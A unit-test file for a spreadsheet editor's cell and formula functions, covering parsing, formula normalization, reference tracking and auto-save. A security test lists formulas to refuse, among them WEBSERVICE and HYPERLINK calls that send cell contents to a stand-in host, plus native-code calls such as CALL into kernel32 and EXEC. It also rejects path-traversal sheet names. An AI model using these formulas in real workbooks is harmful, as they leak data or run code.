/**
 * TODO 1212 stage 1 / stage 2: pure functions for editing `.xlsx` cell values and formulas (`src/shared/xlsx-cells.ts`).
 * Checking the shape of drafts, interpreting input, checking the shape of formulas and their canonical form (`_xlfn.`), formula references, the stale-value mark, and the kinds of signature.
 * The viewer, the host, and main use the same judgment.
 */
import { describe, expect, it } from 'vitest'
import {
  CELL_EDITS_FORMAT,
  MAX_ROWS,
  dateToSerial,
  displayFormula,
  formatRef,
  formulaCellKey,
  formulaReferences,
  normalizeFormulaInput,
  parseCellEdits,
  parseCellInput,
  parseRange,
  parseRef,
  serializeCellEdits,
  shiftReferences,
  staleFormulaCells,
  workbookSignature,
  type CellEdit
} from '../src/shared/xlsx-cells.js'
import { autoSaveDelayFor, CELL_EDITS_MIN_AUTO_SAVE_DELAY_MS } from '../src/shared/auto-save.js'
import { excelSerialToDate } from '../plugins/aios.office/viewer/workbook.js'

const SHEET = 'xl/worksheets/sheet1.xml'

describe('番地', () => {
  it('parseRef / formatRef は往復し、範囲の外は null', () => {
    expect(parseRef('B2')).toEqual({ row: 1, col: 1 })
    expect(parseRef('$XFD$1048576')).toEqual({ row: 1_048_575, col: 16_383 })
    expect(parseRef('XFE1')).toBeNull()
    expect(parseRef('A0')).toBeNull()
    expect(parseRef('A1048577')).toBeNull()
    expect(formatRef(9, 27)).toBe('AB10')
    expect(parseRange('C3:A1')).toEqual({ r1: 0, c1: 0, r2: 2, c2: 2 })
    expect(parseRange('A1:B2:C3')).toBeNull()
  })
})

describe('下書きの形', () => {
  const edit = (ref: string, value: CellEdit['value']): CellEdit => ({ sheet: SHEET, ref, value })

  it('編集が無ければ空文字列、同じセルは最後が勝つ', () => {
    expect(serializeCellEdits([])).toBe('')
    const text = serializeCellEdits([edit('A1', { t: 'n', v: 1 }), edit('B1', { t: 's', v: 'x' }), edit('A1', { t: 'b', v: true })])
    expect(parseCellEdits(text)).toEqual([edit('A1', { t: 'b', v: true }), edit('B1', { t: 's', v: 'x' })])
    expect(parseCellEdits('')).toEqual([])
  })

  it('形のおかしい下書きは全体を null にする (一部だけ書かない)', () => {
    const wrap = (edits: unknown): string => JSON.stringify({ format: CELL_EDITS_FORMAT, edits })
    expect(parseCellEdits('not json')).toBeNull()
    expect(parseCellEdits(JSON.stringify({ format: 'other', edits: [] }))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 'n', v: Number.NaN } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: '../x.xml', ref: 'A1', value: { t: 'empty' } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: '/abs.xml', ref: 'A1', value: { t: 'empty' } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: '$A$1', value: { t: 'empty' } }]))).toBeNull()
    // Formulas must be in canonical form only (the exact result of normalizeFormulaInput). Lowercase, new functions without `_xlfn.`, and broken formulas are refused.
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 'f', v: 'SUM(B1)' } }]))).toEqual([edit('A1', { t: 'f', v: 'SUM(B1)' })])
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 'f', v: 'sum(b1)' } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 'f', v: 'XLOOKUP(1,B:B,C:C)' } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 'f', v: 'SUM(B1' } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 'f', v: 'FILTER(B:B,C:C>1)' } }]))).toBeNull()
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'A1', value: { t: 's', v: 'x'.repeat(32_768) } }]))).toBeNull()
    // Lowercase addresses are aligned to uppercase.
    expect(parseCellEdits(wrap([{ sheet: SHEET, ref: 'b2', value: { t: 'empty' } }]))).toEqual([edit('B2', { t: 'empty' })])
  })
})

describe('parseCellInput', () => {
  const plain = { date: false, date1904: false, sheetNames: ['Data', 'My Sheet'] }
  it('数・真偽・文字列・空・逃がし・数式', () => {
    expect(parseCellInput('12', plain)).toEqual({ ok: true, value: { t: 'n', v: 12 } })
    expect(parseCellInput(' -3.5e2 ', plain)).toEqual({ ok: true, value: { t: 'n', v: -350 } })
    expect(parseCellInput('true', plain)).toEqual({ ok: true, value: { t: 'b', v: true } })
    expect(parseCellInput('1,234', plain)).toEqual({ ok: true, value: { t: 's', v: '1,234' } })
    expect(parseCellInput('10%', plain)).toEqual({ ok: true, value: { t: 's', v: '10%' } })
    expect(parseCellInput('', plain)).toEqual({ ok: true, value: { t: 'empty' } })
    expect(parseCellInput("'=1+2", plain)).toEqual({ ok: true, value: { t: 's', v: '=1+2' } })
    expect(parseCellInput('=1+2', plain)).toEqual({ ok: true, value: { t: 'f', v: '1+2' } })
    expect(parseCellInput("='my sheet'!a1*2", plain)).toEqual({ ok: true, value: { t: 'f', v: "'my sheet'!A1*2" } })
    expect(parseCellInput('=Other!A1', plain)).toEqual({ ok: false, reason: 'formulaUnknownSheet' })
    expect(parseCellInput('=SUM(A1', plain)).toEqual({ ok: false, reason: 'formulaSyntax' })
    expect(parseCellInput('=', plain)).toEqual({ ok: false, reason: 'formulaSyntax' })
    expect(parseCellInput('2026-11-13', plain)).toEqual({ ok: true, value: { t: 's', v: '2026-11-13' } })
  })

  it('日付の書式のセルは日付・時刻を通し番号にし、表示 (excelSerialToDate) と往復する', () => {
    const r = parseCellInput('2026/11/13 9:30', { date: true, date1904: false, sheetNames: [] })
    expect(r.ok).toBe(true)
    if (!r.ok || r.value.t !== 'n') throw new Error('number')
    expect(excelSerialToDate(r.value.v, false).toISOString()).toBe('2026-11-13T09:30:00.000Z')
    const t = parseCellInput('18:00', { date: true, date1904: false, sheetNames: [] })
    expect(t).toEqual({ ok: true, value: { t: 'n', v: 0.75 } })
    const s1904 = dateToSerial({ year: 2026, month: 11, day: 13 }, true)
    expect(s1904).not.toBeNull()
    expect(excelSerialToDate(s1904 ?? 0, true).toISOString()).toBe('2026-11-13T00:00:00.000Z')
    expect(dateToSerial({ year: 2026, month: 2, day: 30 }, false)).toBeNull()
  })
})

describe('normalizeFormulaInput (TODO 1212 段 2)', () => {
  const ok = (input: string): string => {
    const r = normalizeFormulaInput(input)
    if (!r.ok) throw new Error(`${input}: ${r.reason}`)
    return r.formula
  }
  const reason = (input: string): string | null => {
    const r = normalizeFormulaInput(input)
    return r.ok ? null : r.reason
  }

  it('関数名・番地・真偽は大文字に、2010 以降の関数は _xlfn. を付ける。文字列とシート名の中は触らない', () => {
    expect(ok('sum(a1:b2)+$c$3')).toBe('SUM(A1:B2)+$C$3')
    expect(ok('xlookup(a1,b:b,c:c)')).toBe('_xlfn.XLOOKUP(A1,B:B,C:C)')
    expect(ok('_xlfn.IFS(a1>1,"x",true,"y")')).toBe('_xlfn.IFS(A1>1,"x",TRUE,"y")')
    expect(ok('concat("a1", \'b c\'!a1)')).toBe('_xlfn.CONCAT("a1", \'b c\'!A1)')
    expect(ok('stdev.s(1:3)')).toBe('_xlfn.STDEV.S(1:3)')
    expect(ok('-a1%^2')).toBe('-A1%^2')
    expect(ok('now()')).toBe('NOW()')
    expect(ok('IF(A1,,)')).toBe('IF(A1,,)')
    expect(ok('SUM({1,2;3,-4})')).toBe('SUM({1,2;3,-4})')
    expect(ok('A1<>B1')).toBe('A1<>B1')
    expect(ok('1.5E+3*Tax')).toBe('1.5E+3*Tax')
    expect(ok('IFERROR(1/0,#N/A)')).toBe('IFERROR(1/0,#N/A)')
    expect(ok('SUM((A1,B1))')).toBe('SUM((A1,B1))')
    // Canonical form is idempotent (main re-checks with this).
    expect(ok(ok('textjoin(",",true,a1:a3)'))).toBe('_xlfn.TEXTJOIN(",",TRUE,A1:A3)')
  })

  it('壊れた式・断る形', () => {
    for (const bad of ['SUM(A1', 'SUM(A1))', '"abc', "'Sheet!A1", '1+', '*2', 'A1 2', ',A1', 'A1,B1', '()', '(1)(2)', 'F(1;2)', '{1,}', '2abc', 'A1!B1!C1']) {
      expect([bad, reason(bad)]).toEqual([bad, expect.stringMatching(/^formula/)])
    }
    expect(reason('SUM(A1')).toBe('formulaSyntax')
    expect(reason('A1\nB1')).toBe('formulaSyntax')
    expect(reason('x'.repeat(8_193))).toBe('formulaTooLong')
    expect(reason('FILTER(A:A,B:B>1)')).toBe('formulaDynamic')
    expect(reason('_xlfn._xlws.SORT(A1:A3)')).toBe('formulaDynamic')
    expect(reason('LET(x,1,x+1)')).toBe('formulaDynamic')
    expect(reason('@A1:A3')).toBe('formulaDynamic')
    expect(reason('SUM(A1#)')).toBe('formulaDynamic')
    expect(reason('SUM(Table1[Amount])')).toBe('formulaUnsupportedRef')
    expect(reason('[1]Sheet1!A1')).toBe('formulaUnsupportedRef')
    expect(reason('SUM(Sheet1:Sheet3!A1)')).toBe('formulaUnsupportedRef')
    expect(reason('A1:B2 B1:C3')).toBe('formulaUnsupportedRef')
  })

  it('引用符の要るシート名は、引用符なしなら断り、引用符付きなら通す (TODO 1212 の直し)', () => {
    for (const name of ['2024', '1Q', 'A1', 'AB12', 'R1C1', 'R2C3', 'RC', 'R', 'C']) {
      expect([name, reason(`${name}!B2`)]).toEqual([name, 'formulaSyntax'])
      expect(ok(`'${name}'!B2`)).toBe(`'${name}'!B2`)
    }
    // Names that need no quotes pass as before.
    expect(ok('Sheet1!B2')).toBe('Sheet1!B2')
    expect(ok('Data!B2')).toBe('Data!B2')
  })

  it('関数名は許可の表だけ: 外へ通信する・外のコードを呼ぶ・利用者定義・知らない関数は formulaFunction (セキュリティレビュー)', () => {
    for (const bad of [
      'WEBSERVICE("https://x.example/?"&A1)',
      '_xlfn.WEBSERVICE("https://x.example/")',
      'HYPERLINK("https://x.example/?"&A1,"x")',
      'IMAGE("https://x.example/a.png")',
      'STOCKHISTORY("X",TODAY())',
      'RTD("prog",,"a")',
      'CALL("kernel32","x","J")',
      'REGISTER.ID("lib","fn")',
      'EUROCONVERT(1,"DEM","EUR")',
      '_xludf.MyMacro(A1)',
      'MyMacro(A1)',
      '_xlfn.UNKNOWNFN(1)',
      'EXEC("calc")'
    ]) {
      expect([bad, reason(bad)]).toEqual([bad, 'formulaFunction'])
    }
    // Functions that only read the environment (with no route to the outside) and XML built-ins pass.
    expect(ok('cell("filename",a1)&info("osversion")')).toBe('CELL("filename",A1)&INFO("osversion")')
    expect(ok('encodeurl(a1)')).toBe('_xlfn.ENCODEURL(A1)')
    // Refused also at the point where main re-checks (parseCellEdits).
    const draft = JSON.stringify({ format: CELL_EDITS_FORMAT, edits: [{ sheet: 'xl/worksheets/sheet1.xml', ref: 'A1', value: { t: 'f', v: '_xlfn.WEBSERVICE("https://x.example/")' } }] })
    expect(parseCellEdits(draft)).toBeNull()
    const udf = JSON.stringify({ format: CELL_EDITS_FORMAT, edits: [{ sheet: 'xl/worksheets/sheet1.xml', ref: 'A1', value: { t: 'f', v: '_xludf.MYMACRO(A1)' } }] })
    expect(parseCellEdits(udf)).toBeNull()
  })

  it('参照しているシート名を返す', () => {
    const r = normalizeFormulaInput("Data!A1+'It''s'!B2+SUM(x!A:A)")
    expect(r.ok && r.sheets).toEqual(['Data', "It's", 'x'])
  })

  it('displayFormula は表にある関数の _xlfn. を外し、normalizeFormulaInput で元に戻る', () => {
    const file = '_xlfn.XLOOKUP(A1,B:B,C:C)&_xlfn.STDEV.S(1)&"_xlfn.IFS("'
    const shown = displayFormula(file)
    expect(shown).toBe('XLOOKUP(A1,B:B,C:C)&STDEV.S(1)&"_xlfn.IFS("')
    expect(ok(shown)).toBe(file)
    // A prefix of a name not in the table is not removed on screen either (write-back is outside the allow table, so it is refused).
    expect(displayFormula('_xlfn.UNKNOWNFN(1)')).toBe('_xlfn.UNKNOWNFN(1)')
  })
})

describe('workbookSignature', () => {
  it('文書の署名とマクロの署名を分ける', () => {
    expect(workbookSignature(['xl/workbook.xml', 'xl/vbaProject.bin'])).toBeNull()
    expect(workbookSignature(['xl/vbaProject.bin', 'xl/vbaProjectSignature.bin'])).toBe('signedMacro')
    expect(workbookSignature(['xl/vbaProjectSignatureAgile.bin'])).toBe('signedMacro')
    expect(workbookSignature(['_xmlsignatures/sig1.xml', 'xl/vbaProjectSignature.bin'])).toBe('signed')
  })
})

describe('formulaReferences', () => {
  it('セル・範囲・列・行・シート名付き (引用符・数字始まり) を拾う', () => {
    const r = formulaReferences(`SUM(A1:B2)+$C$3+Sheet2!D4+'My Sheet'!E5:E6+SUM(F:F)+SUM(2:3)+'2024年'!A1`)
    expect(r.opaque).toBe(false)
    expect(r.refs.map((ref) => [ref.sheet, ref.range])).toEqual([
      [null, { r1: 0, c1: 0, r2: 1, c2: 1 }],
      [null, { r1: 2, c1: 2, r2: 2, c2: 2 }],
      ['Sheet2', { r1: 3, c1: 3, r2: 3, c2: 3 }],
      ['My Sheet', { r1: 4, c1: 4, r2: 5, c2: 4 }],
      [null, { r1: 0, c1: 5, r2: MAX_ROWS - 1, c2: 5 }],
      [null, { r1: 1, c1: 0, r2: 2, c2: 16_383 }],
      ['2024年', { r1: 0, c1: 0, r2: 0, c2: 0 }]
    ])
  })

  it('文字列の中・関数名・数・真偽は参照にしない', () => {
    const r = formulaReferences('IF(TRUE,"A1"&LOG10(100),1.5E+3)')
    expect(r.refs).toEqual([])
    expect(r.opaque).toBe(false)
  })

  it('定義名・構造化参照・外部参照・INDIRECT・3D 参照は読めない (opaque)', () => {
    expect(formulaReferences('Tax*2').opaque).toBe(true)
    expect(formulaReferences('SUM(Table1[Amount])').opaque).toBe(true)
    expect(formulaReferences('[1]Sheet1!A1').opaque).toBe(true)
    expect(formulaReferences('INDIRECT("A"&B1)').opaque).toBe(true)
    expect(formulaReferences('_xlfn.XLOOKUP(A1,B:B,C:C)').opaque).toBe(true)
    expect(formulaReferences('SUM(Sheet1:Sheet3!A1)').opaque).toBe(true)
  })

  it('共有数式の子は相対の片だけ動く', () => {
    const parent = formulaReferences('A2*$B$1+C$1')
    const shifted = shiftReferences(parent.refs, 3, 1)
    expect(shifted.map((ref) => ref.range)).toEqual([
      { r1: 4, c1: 1, r2: 4, c2: 1 },
      { r1: 0, c1: 1, r2: 0, c2: 1 },
      { r1: 0, c1: 3, r2: 0, c2: 3 }
    ])
  })
})

describe('staleFormulaCells', () => {
  const cell = (sheet: string, row: number, col: number, formula: string) => ({
    sheet,
    row,
    col,
    ...formulaReferences(formula)
  })

  it('直接・間接に依存する数式だけ、シート名は大小を問わない', () => {
    const formulas = [
      cell('S', 1, 3, 'B2*C2'), // D2 ← B2
      cell('S', 4, 3, 'SUM(D2:D4)'), // D5 ← D2
      cell('Other', 0, 0, 's!D5'), // Other!A1 ← S!D5
      cell('S', 9, 9, 'Z99') // unrelated
    ]
    const stale = staleFormulaCells(formulas, [{ sheet: 'S', row: 1, col: 1 }])
    expect([...stale].sort()).toEqual(
      [formulaCellKey('S', 1, 3), formulaCellKey('S', 4, 3), formulaCellKey('Other', 0, 0)].sort()
    )
    expect(staleFormulaCells(formulas, []).size).toBe(0)
  })

  it('読めない参照の数式は、何か 1 つ変われば古い (控えめに倒す)', () => {
    const stale = staleFormulaCells([cell('S', 0, 0, 'Tax*2'), cell('S', 0, 1, 'A1+1')], [{ sheet: 'S', row: 50, col: 50 }])
    expect(stale.has(formulaCellKey('S', 0, 0))).toBe(true)
    expect(stale.has(formulaCellKey('S', 0, 1))).toBe(true)
  })
})

describe('自動保存の待ち時間', () => {
  it('セルの値の下書きだけ下限を掛ける', () => {
    expect(autoSaveDelayFor(1000, false)).toBe(1000)
    expect(autoSaveDelayFor(1000, true)).toBe(CELL_EDITS_MIN_AUTO_SAVE_DELAY_MS)
    expect(autoSaveDelayFor(10_000, true)).toBe(10_000)
  })
})
